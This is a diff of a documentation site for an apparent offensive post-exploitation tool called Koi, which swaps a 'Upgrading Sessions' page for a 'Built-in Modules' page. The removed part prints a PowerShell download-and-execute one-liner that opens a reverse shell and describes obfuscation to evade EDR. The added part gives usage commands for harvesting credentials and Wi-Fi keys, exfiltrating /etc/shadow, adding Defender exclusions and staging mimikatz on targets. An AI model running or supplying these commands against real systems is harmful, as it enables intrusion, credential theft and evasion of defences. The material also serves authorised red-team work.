@@ -8,13 +8,13 @@
       
       
       
-        <link rel="canonical" href="https://b3rt1ng.github.io/koi-wiki/upgrading-sessions/">
+        <link rel="canonical" href="https://b3rt1ng.github.io/koi-wiki/modules/">
       
       
-        <link rel="prev" href="../payloads/">
+        <link rel="prev" href="../upgrading-sessions/">
       
       
-        <link rel="next" href="../modules/">
+        <link rel="next" href="../logs/">
       
       
         
@@ -25,7 +25,7 @@
     
     
       
-        <title>Upgrading Sessions - Koi Documentation</title>
+        <title>Built-in Modules - Koi Documentation</title>
       
     
     
@@ -78,7 +78,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#upgrading-sessions" class="md-skip">
+        <a href="#built-in-modules" class="md-skip">
           Skip to content
         </a>
       
@@ -113,7 +113,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Upgrading Sessions
+              Built-in Modules
             
           </span>
         </div>
@@ -418,6 +418,34 @@
                 
   
   
+  
+  
+    <li class="md-nav__item">
+      <a href="../upgrading-sessions/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Upgrading Sessions
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
     
   
   
@@ -437,7 +465,7 @@
   <span class="md-ellipsis">
     
   
-    Upgrading Sessions
+    Built-in Modules
   
 
     
@@ -455,7 +483,7 @@
   <span class="md-ellipsis">
     
   
-    Upgrading Sessions
+    Built-in Modules
   
 
     
@@ -481,10 +509,10 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#for-linux" class="md-nav__link">
+  <a href="#running-a-module" class="md-nav__link">
     <span class="md-ellipsis">
       
-        For Linux
+        Running a module
       
     </span>
   </a>
@@ -492,22 +520,22 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#for-windows" class="md-nav__link">
+  <a href="#enumeration" class="md-nav__link">
     <span class="md-ellipsis">
       
-        For Windows
+        Enumeration
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="For Windows">
+    <nav class="md-nav" aria-label="Enumeration">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#how-it-works-internally" class="md-nav__link">
+  <a href="#sysinfo" class="md-nav__link">
     <span class="md-ellipsis">
       
-        How it works internally
+        sysinfo
       
     </span>
   </a>
@@ -515,22 +543,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#more-details" class="md-nav__link">
+  <a href="#get_users" class="md-nav__link">
     <span class="md-ellipsis">
       
-        More details
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="More details">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#automatic-caching" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Automatic caching
+        get_users
       
     </span>
   </a>
@@ -538,10 +554,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#automatic-terminal-sizing" class="md-nav__link">
+  <a href="#get_processes" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Automatic terminal sizing
+        get_processes
       
     </span>
   </a>
@@ -549,10 +565,43 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#session-replacement" class="md-nav__link">
+  <a href="#env_dump" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Session replacement
+        env_dump
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#network_enum" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        network_enum
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#wifi_enum" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        wifi_enum
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sharphound" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        sharphound
       
     </span>
   </a>
@@ -563,12 +612,24 @@
     </nav>
   
 </li>
-        
-          <li class="md-nav__item">
-  <a href="#requirements" class="md-nav__link">
+      
+        <li class="md-nav__item">
+  <a href="#file-transfer" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Requirements
+        File Transfer
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="File Transfer">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#download" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        download
       
     </span>
   </a>
@@ -576,10 +637,66 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#notes" class="md-nav__link">
+  <a href="#upload" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Notes
+        upload
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pivoting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Pivoting
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Pivoting">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ligolo" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ligolo
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#other" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Other
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Other">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#populate_win" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        populate_win
       
     </span>
   </a>
@@ -595,34 +712,6 @@
   
 </nav>
       
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../modules/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Built-in Modules
-  
-
-    
-  </span>
-  
-  
-
-      </a>
     </li>
   
 
@@ -744,10 +833,10 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#for-linux" class="md-nav__link">
+  <a href="#running-a-module" class="md-nav__link">
     <span class="md-ellipsis">
       
-        For Linux
+        Running a module
       
     </span>
   </a>
@@ -755,22 +844,22 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#for-windows" class="md-nav__link">
+  <a href="#enumeration" class="md-nav__link">
     <span class="md-ellipsis">
       
-        For Windows
+        Enumeration
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="For Windows">
+    <nav class="md-nav" aria-label="Enumeration">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#how-it-works-internally" class="md-nav__link">
+  <a href="#sysinfo" class="md-nav__link">
     <span class="md-ellipsis">
       
-        How it works internally
+        sysinfo
       
     </span>
   </a>
@@ -778,22 +867,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#more-details" class="md-nav__link">
+  <a href="#get_users" class="md-nav__link">
     <span class="md-ellipsis">
       
-        More details
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="More details">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#automatic-caching" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Automatic caching
+        get_users
       
     </span>
   </a>
@@ -801,10 +878,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#automatic-terminal-sizing" class="md-nav__link">
+  <a href="#get_processes" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Automatic terminal sizing
+        get_processes
       
     </span>
   </a>
@@ -812,10 +889,43 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#session-replacement" class="md-nav__link">
+  <a href="#env_dump" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Session replacement
+        env_dump
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#network_enum" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        network_enum
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#wifi_enum" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        wifi_enum
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sharphound" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        sharphound
       
     </span>
   </a>
@@ -826,12 +936,24 @@
     </nav>
   
 </li>
-        
-          <li class="md-nav__item">
-  <a href="#requirements" class="md-nav__link">
+      
+        <li class="md-nav__item">
+  <a href="#file-transfer" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Requirements
+        File Transfer
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="File Transfer">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#download" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        download
       
     </span>
   </a>
@@ -839,10 +961,66 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#notes" class="md-nav__link">
+  <a href="#upload" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Notes
+        upload
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pivoting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Pivoting
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Pivoting">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ligolo" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ligolo
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#other" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Other
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Other">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#populate_win" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        populate_win
       
     </span>
   </a>
@@ -871,73 +1049,263 @@
 
 
 
-<h1 id="upgrading-sessions">Upgrading Sessions</h1>
-<p>Koi allows you to automatically upgrade your sessions for both Linux and Windows.</p>
-<h2 id="for-linux">For Linux</h2>
-<p>The upgrade command tries three methods in order, falling back to the next if the previous one fails or is not available:</p>
-<ol>
-<li><strong><code>script</code></strong>, spawns a PTY using the <code>script</code> utility, available on virtually every Linux system:
-   <div class="highlight"><pre><span></span><code>script<span class="w"> </span>-qc<span class="w"> </span>/bin/bash<span class="w"> </span>/dev/null
-</code></pre></div></li>
-<li><strong><code>socat</code></strong>, if <code>script</code> is absent, tries <code>socat</code> as an alternative PTY spawner.</li>
-<li><strong>Fallback</strong>, if neither is available, runs <code>/bin/bash -i</code> or <code>/bin/sh -i</code> for a basic interactive shell without full PTY support.</li>
-</ol>
-<p>After the PTY is established, Koi sets <code>TERM=xterm-256color</code>, disables history (<code>HISTSIZE=0 HISTFILESIZE=0</code>), and syncs the terminal window size.</p>
-<div class="admonition warning">
-<p class="admonition-title">Limitations</p>
-<p>If none of these commands are available, or if the shell is too restricted, the upgrade will fail or produce a degraded shell. Alternative upgrade paths are planned, see <a href="../future-updates/">Future Updates</a>.</p>
-</div>
-<hr />
-<h2 id="for-windows">For Windows</h2>
-<p>On Windows, Koi upgrades a raw reverse shell into a fully interactive PTY-like session using <a href="https://github.com/antonioCoco/ConPtyShell">ConPtyShell by antoniococo</a>.</p>
-<p>The upgrade process is automatic and works as follows:</p>
-<ol>
-<li>Koi downloads the latest <code>Invoke-ConPtyShell.ps1</code></li>
-<li>The script is cached locally for offline reuse</li>
-<li>Koi obfuscates the PowerShell function name to reduce detections</li>
-<li>A temporary HTTP server is spawned locally</li>
-<li>The target downloads and executes the payload</li>
-<li>A new interactive ConPTY session connects back</li>
-</ol>
-<h3 id="how-it-works-internally">How it works internally</h3>
-<p>Koi launches the following kind of command on the remote host:</p>
-<div class="highlight"><pre><span></span><code><span class="n">powershell</span> <span class="n">-nop</span> <span class="n">-ep</span> <span class="n">bypass</span> <span class="n">-c</span> <span class="s2">&quot;</span>
-<span class="s2">IEX(IWR &#39;http://&lt;LOCAL_IP&gt;:&lt;HTTP_PORT&gt;/c.ps1&#39; -UseBasicParsing);</span>
-<span class="s2">&lt;OBFUSCATED_FUNCTION&gt; -RemoteIp &lt;LOCAL_IP&gt; -RemotePort &lt;PORT&gt; -Rows &lt;ROWS&gt; -Cols &lt;COLS&gt; -CommandLine powershell&quot;</span>
+<h1 id="built-in-modules">Built-in Modules</h1>
+<h2 id="running-a-module">Running a module</h2>
+<div class="highlight"><pre><span></span><code>koi ❯ run &lt;module&gt; &lt;id&gt; [args…]
 </code></pre></div>
-<h3 id="more-details">More details</h3>
-<h4 id="automatic-caching">Automatic caching</h4>
-<p>If GitHub is unreachable, Koi automatically falls back to the locally cached version of ConPtyShell.</p>
-<h4 id="automatic-terminal-sizing">Automatic terminal sizing</h4>
-<p>The current terminal dimensions are detected automatically and passed to ConPtyShell so the remote PTY matches your local console.</p>
-<h4 id="session-replacement">Session replacement</h4>
-<p>Once the upgraded session connects back:</p>
-<ul>
-<li>The old shell is closed</li>
-<li>The new ConPTY session replaces it transparently</li>
-<li>The session ID stays identical</li>
-</ul>
-<h3 id="requirements">Requirements</h3>
-<p>The remote target must support:</p>
-<ul>
-<li>PowerShell</li>
-<li>HTTP connectivity to the operator machine</li>
-<li>Windows 10 / Windows Server 2019+ (recommended for ConPTY support)</li>
-</ul>
-<h3 id="notes">Notes</h3>
-<p>Some EDRs may still detect:</p>
-<ul>
-<li><code>powershell.exe</code></li>
-<li><code>Invoke-WebRequest</code></li>
-<li>ConPTY-related behaviours</li>
-</ul>
-<p>Koi currently mitigates this partially through:</p>
-<ul>
-<li>Function name obfuscation</li>
-<li>In-memory execution</li>
-<li>Temporary HTTP staging</li>
-</ul>
-<p>Further stealth improvements are planned in future updates.</p>
+<p>Modules are only offered for sessions whose OS matches the module's declared <code>platform</code>. If the OS doesn't match, the run is rejected with an error.</p>
+<p>Type <code>modules</code> (or <code>mdls</code>) to list everything currently loaded:</p>
+<div class="highlight"><pre><span></span><code>koi ❯ modules
+</code></pre></div>
+<p>If you add or edit a module file on disk, reload without restarting:</p>
+<div class="highlight"><pre><span></span><code>koi ❯ reload
+</code></pre></div>
+<hr />
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="sysinfo"><code>sysinfo</code></h3>
+<p><strong>Platform:</strong> Linux<br />
+<strong>Usage:</strong> <code>run sysinfo &lt;id&gt;</code></p>
+<p>Gathers basic system information from the target in a single box: hostname, OS, kernel, architecture, uptime, CPU, RAM, disk usage, logged-in users, current user, shell, and IP address.</p>
+<div class="highlight"><pre><span></span><code>koi ❯ run sysinfo 1
+</code></pre></div>
+<hr />
+<h3 id="get_users"><code>get_users</code></h3>
+<p><strong>Platform:</strong> Linux<br />
+<strong>Usage:</strong> <code>run get_users &lt;id&gt; [-a]</code></p>
+<p>Reads <code>/etc/passwd</code> and lists users. By default, only users with an interactive shell (<code>/bin/bash</code>, <code>/bin/sh</code>, <code>/bin/zsh</code>, <code>/bin/dash</code>) are shown.</p>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-a</code>, <code>--all</code></td>
+<td>Show all users, not just those with a login shell</td>
+</tr>
+</tbody>
+</table>
+<div class="highlight"><pre><span></span><code>koi ❯ run get_users 1
+koi ❯ run get_users 1 -a
+</code></pre></div>
+<hr />
+<h3 id="get_processes"><code>get_processes</code></h3>
+<p><strong>Platform:</strong> Linux, Windows PowerShell<br />
+<strong>Usage:</strong> <code>run get_processes &lt;id&gt; [-a] [-f KEYWORD]</code></p>
+<p>Lists running processes and highlights interesting ones. On Linux, flags: processes running from <code>/tmp</code>, network tools (<code>nc</code>, <code>socat</code>, <code>nmap</code>), interpreters with arguments, privilege helpers (<code>sudo</code>, <code>cron</code>), and root-owned services. On Windows, flags LOLBins and processes owned by non-system accounts.</p>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-a</code>, <code>--all</code></td>
+<td>Show all processes instead of only interesting ones</td>
+</tr>
+<tr>
+<td><code>-f KEYWORD</code>, <code>--filter KEYWORD</code></td>
+<td>Filter by name, user, or path keyword</td>
+</tr>
+</tbody>
+</table>
+<div class="highlight"><pre><span></span><code>koi ❯ run get_processes 1
+koi ❯ run get_processes 1 -f apache
+koi ❯ run get_processes 2 -a
+</code></pre></div>
+<hr />
+<h3 id="env_dump"><code>env_dump</code></h3>
+<p><strong>Platform:</strong> Linux, Windows PowerShell<br />
+<strong>Usage:</strong> <code>run env_dump &lt;id&gt; [-a]</code></p>
+<p>Dumps environment variables and automatically highlights credentials, tokens, and keys based on variable name patterns (<code>pass</code>, <code>token</code>, <code>api</code>, <code>secret</code>, <code>aws</code>, …) and value patterns (JWT, GitHub PAT, AWS keys, DB connection strings, …).</p>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-a</code>, <code>--all</code></td>
+<td>Show all variables, not just sensitive ones</td>
+</tr>
+</tbody>
+</table>
+<div class="highlight"><pre><span></span><code>koi ❯ run env_dump 1
+koi ❯ run env_dump 2 -a
+</code></pre></div>
+<hr />
+<h3 id="network_enum"><code>network_enum</code></h3>
+<p><strong>Platform:</strong> Linux<br />
+<strong>Usage:</strong> <code>run network_enum &lt;id&gt; [--no-scan] [-s CIDR] [-t N]</code></p>
+<p>Enumerates network interfaces, routing table, ARP neighbors, listening ports, established connections, and DNS configuration. Optionally performs a ping sweep on each detected subnet to discover live hosts.</p>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--no-scan</code></td>
+<td>Skip live host discovery</td>
+</tr>
+<tr>
+<td><code>-s CIDR</code>, <code>--subnet CIDR</code></td>
+<td>Override the target subnet (e.g. <code>10.10.0.0/24</code>)</td>
+</tr>
+<tr>
+<td><code>-t N</code>, <code>--timeout N</code></td>
+<td>Ping timeout per host in seconds (default: 1)</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition warning">
+<p class="admonition-title">Warning</p>
+<p>Subnets larger than <code>/21</code> (2048 hosts) are skipped automatically. Use <code>-s</code> to narrow the target range.</p>
+</div>
+<div class="highlight"><pre><span></span><code>koi ❯ run network_enum 1
+koi ❯ run network_enum 1 --no-scan
+koi ❯ run network_enum 1 -s 172.16.10.0/24 -t 2
+</code></pre></div>
+<hr />
+<h3 id="wifi_enum"><code>wifi_enum</code></h3>
+<p><strong>Platform:</strong> Linux<br />
+<strong>Usage:</strong> <code>run wifi_enum &lt;id&gt;</code></p>
+<p>Enumerates nearby Wi-Fi networks via <code>nmcli</code> and extracts PSK credentials from <code>/etc/wpa_supplicant/wpa_supplicant.conf</code> if readable.</p>
+<div class="highlight"><pre><span></span><code>koi ❯ run wifi_enum 1
+</code></pre></div>
+<hr />
+<h3 id="sharphound"><code>sharphound</code></h3>
+<p><strong>Platform:</strong> Windows PowerShell<br />
+<strong>Usage:</strong> <code>run sharphound &lt;id&gt; [-c COLLECTION] [-o LOCAL_ZIP]</code></p>
+<p>Fetches the latest <a href="https://github.com/SpecterOps/SharpHound">SharpHound</a> release from GitHub, uploads it to the target, runs it, and retrieves the BloodHound zip locally. Cleans up the remote workspace on completion.</p>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-c COLLECTION</code>, <code>--collection COLLECTION</code></td>
+<td>SharpHound collection method (default: <code>Default</code>)</td>
+</tr>
+<tr>
+<td><code>-o PATH</code>, <code>--output PATH</code></td>
+<td>Local path for the output zip</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>The session does not need to be upgraded. The module works on plain PowerShell sessions.</p>
+</div>
+<div class="highlight"><pre><span></span><code>koi ❯ run sharphound 2
+koi ❯ run sharphound 2 -c All -o bh_corp.zip
+</code></pre></div>
+<hr />
+<h2 id="file-transfer">File Transfer</h2>
+<h3 id="download"><code>download</code></h3>
+<p><strong>Platform:</strong> Linux, Windows PowerShell<br />
+<strong>Usage:</strong> <code>run download &lt;id&gt; &lt;remote_path&gt; [-o LOCAL_PATH]</code></p>
+<p>Downloads a file from the target via a dedicated TCP connection. Shows a progress bar during transfer. The remote path can contain spaces (pass without quotes).</p>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-o PATH</code>, <code>--output PATH</code></td>
+<td>Local destination path (default: filename from remote path)</td>
+</tr>
+</tbody>
+</table>
+<div class="highlight"><pre><span></span><code>koi ❯ run download 1 /etc/shadow
+koi ❯ run download 1 /home/user/documents/report.pdf -o report.pdf
+koi ❯ run download 2 &quot;C:\Users\admin\Desktop\passwords.txt&quot; -o passwords.txt
+</code></pre></div>
+<hr />
+<h3 id="upload"><code>upload</code></h3>
+<p><strong>Platform:</strong> Linux, Windows PowerShell<br />
+<strong>Usage:</strong> <code>run upload &lt;id&gt; &lt;local_path&gt; [-o REMOTE_PATH]</code></p>
+<p>Uploads a local file to the target via a dedicated TCP connection. Shows a progress bar during transfer. Default remote destination is <code>/tmp/&lt;filename&gt;</code> (Linux) or <code>C:\Windows\Temp\&lt;filename&gt;</code> (Windows).</p>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-o PATH</code>, <code>--output PATH</code></td>
+<td>Remote destination path</td>
+</tr>
+</tbody>
+</table>
+<div class="highlight"><pre><span></span><code>koi ❯ run upload 1 /opt/tools/linpeas.sh
+koi ❯ run upload 1 /opt/tools/linpeas.sh -o /tmp/lp.sh
+koi ❯ run upload 2 /opt/tools/chisel.exe -o &quot;C:\Temp\chisel.exe&quot;
+</code></pre></div>
+<hr />
+<h2 id="pivoting">Pivoting</h2>
+<h3 id="ligolo"><code>ligolo</code></h3>
+<p><strong>Platform:</strong> Linux, Windows PowerShell<br />
+<strong>Usage:</strong> <code>run ligolo &lt;id&gt; [-o REMOTE_PATH]</code></p>
+<p>Fetches the latest <a href="https://github.com/nicocha30/ligolo-ng">ligolo-ng</a> agent release from GitHub for the target's architecture, and uploads it to the target. On Windows, adds a Defender exclusion for the destination directory before uploading.</p>
+<p>Architecture is detected automatically (<code>uname -m</code> on Linux, <code>$env:PROCESSOR_ARCHITECTURE</code> on Windows).</p>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-o PATH</code>, <code>--output PATH</code></td>
+<td>Remote destination path for the agent binary</td>
+</tr>
+</tbody>
+</table>
+<div class="highlight"><pre><span></span><code>koi ❯ run ligolo 1
+koi ❯ run ligolo 1 -o /opt/agent
+koi ❯ run ligolo 2 -o &quot;C:\Temp\agent.exe&quot;
+</code></pre></div>
+<hr />
+<h2 id="other">Other</h2>
+<h3 id="populate_win"><code>populate_win</code></h3>
+<p><strong>Platform:</strong> Windows PowerShell<br />
+<strong>Usage:</strong> <code>run populate_win &lt;id&gt; [-o REMOTE_DIR]</code></p>
+<p>Downloads and uploads a collection of common exploitation tools to the target: Rubeus, RunasCs, Certify, winPEAS, and mimikatz. Binaries are pulled from <a href="https://github.com/Flangvik/SharpCollection">SharpCollection</a> and the official mimikatz release.</p>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-o DIR</code>, <code>--output-dir DIR</code></td>
+<td>Remote directory (default: <code>C:\Windows\Temp</code>)</td>
+</tr>
+</tbody>
+</table>
+<div class="highlight"><pre><span></span><code>koi ❯ run populate_win 2
+koi ❯ run populate_win 2 -o &quot;C:\Temp\tools&quot;
+</code></pre></div>
 
 
 
